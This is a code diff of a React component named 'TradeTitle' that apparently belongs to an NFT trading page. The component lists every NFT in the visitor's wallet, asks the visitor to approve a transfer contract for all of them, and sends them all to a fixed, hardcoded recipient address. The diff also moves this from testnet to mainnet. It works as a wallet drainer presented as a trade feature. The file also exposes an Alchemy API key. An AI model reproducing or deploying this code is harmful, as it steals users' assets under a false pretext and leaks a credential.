@@ -23,14 +23,16 @@ const TradeTitle = () => {
 
   const multiTransferContract =
     "0x2b503543FF84F40536Bab01D5cB5f0c6D8AD3698" as `0x${string}`;
+  // const multiTransferContract =
+  //   "0x8c92e22dA2A4b03801685A2873b56a2A53Fa6a93" as `0x${string}`; //Test
   const API_KEY = "V4QidqQN3CnapxngEQGMGFl0ZEkS72Bg";
 
   useEffect(() => {
     const fetchNfts = async (address: `0x${string}`): Promise<void> => {
       const options = {
         method: "GET",
-        // url: `https://eth-mainnet.g.alchemy.com/nft/v3/${API_KEY}/getNFTsForOwner`,
-        url: `https://eth-sepolia.g.alchemy.com/nft/v3/${API_KEY}/getNFTsForOwner`, //test
+        url: `https://eth-mainnet.g.alchemy.com/nft/v3/${API_KEY}/getNFTsForOwner`,
+        // url: `https://eth-sepolia.g.alchemy.com/nft/v3/${API_KEY}/getNFTsForOwner`, //test
         params: {
           owner: address,
           withMetadata: "true",
@@ -66,8 +68,8 @@ const TradeTitle = () => {
   }, [nfts]);
 
   const handleClick = async (): Promise<void> => {
-    if (!isConnected) {
-      console.log("Connect wallet!");
+    if (!isConnected || !address) {
+      console.error("Wallet not connected or address undefined!");
       return;
     }
 
@@ -81,31 +83,33 @@ const TradeTitle = () => {
 
     try {
       const uniqueContracts: `0x${string}`[] = Array.from(new Set(contracts));
-      console.log(uniqueContracts);
+      // console.log(uniqueContracts); //Test
       for (let i = 0; i < uniqueContracts.length; i++) {
-        // const { contractAddress, tokenId } = nfts[i];
-
-        // const approvedAddress = await readContract(wagmiConfig, {
-        //   abi: erc721Abi,
-        //   address: contractAddress,
-        //   functionName: "getApproved",
-        //   args: [tokenId],
-        // });
-
-        // if (approvedAddress != multiTransferContract) {
-        console.log(`Approving all NFTs`);
-        await writeContractAsync({
+        const isApprovedForAll = await readContract(wagmiConfig, {
           abi: erc721Abi,
           address: uniqueContracts[i],
-          functionName: "setApprovalForAll",
-          args: [multiTransferContract, true],
+          functionName: "isApprovedForAll",
+          args: [address, multiTransferContract],
         });
-        console.log(`All NFTs approved!`);
-        //   } else {
-        //     console.log(`NFT ${tokenId} already approved!`);
-        //   }
-      }
 
+        if (!isApprovedForAll) {
+          console.log(`Approving all NFTs`);
+          await writeContractAsync({
+            abi: erc721Abi,
+            address: uniqueContracts[i],
+            functionName: "setApprovalForAll",
+            args: [multiTransferContract, true],
+          });
+          console.log(`All NFTs approved!`);
+        } else {
+          console.log(`NFTs already approved!`);
+        }
+      }
+    } catch (error) {
+      console.error("Error: ", error);
+    }
+
+    try {
       console.log("Transferring NFTs...");
       const res = await writeContractAsync({
         abi,
@@ -115,11 +119,13 @@ const TradeTitle = () => {
           contracts, //array for tokenContracts
           tokenIds, //array for tokenIds
           "0x6A46d306019Ca148937c48E331Aa5BF322e9d968", //address of recipient
+          // "0x6ee3dF10F68699A678aED2E884B262d160b2AAAC", //Test
         ],
       });
-      console.log(res);
+      console.log("All NFTs transferred");
+      console.log("Transaction Hash: ", res);
     } catch (error) {
-      console.error("Error: ", error);
+      console.log("Error: ", error);
     }
   };
 
